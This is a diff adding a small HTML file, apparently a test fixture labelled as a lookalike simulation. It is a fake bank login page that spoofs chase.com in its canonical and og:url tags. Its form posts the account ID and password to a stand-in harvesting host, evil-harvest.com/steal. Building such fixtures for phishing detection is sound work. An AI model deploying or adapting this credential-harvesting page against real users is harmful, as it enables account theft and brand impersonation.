@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Account Login — Lookalike Simulation</title>
+  <!-- Spoofed identity markers -->
+  <link rel="canonical" href="https://chase.com/login">
+  <meta property="og:url" content="https://chase.com/login">
+</head>
+<body>
+  <h1>Secure Account Login</h1>
+  <form id="homograph-form" action="https://evil-harvest.com/steal" method="POST">
+    <label for="user">Account ID:</label>
+    <input type="text" id="user" name="user" value="victim"><br><br>
+    <label for="pass">Password:</label>
+    <input type="password" id="pass" name="pass" value="supersecret"><br><br>
+    <button type="submit" id="submit-btn">Sign In</button>
+  </form>
+</body>
+</html>
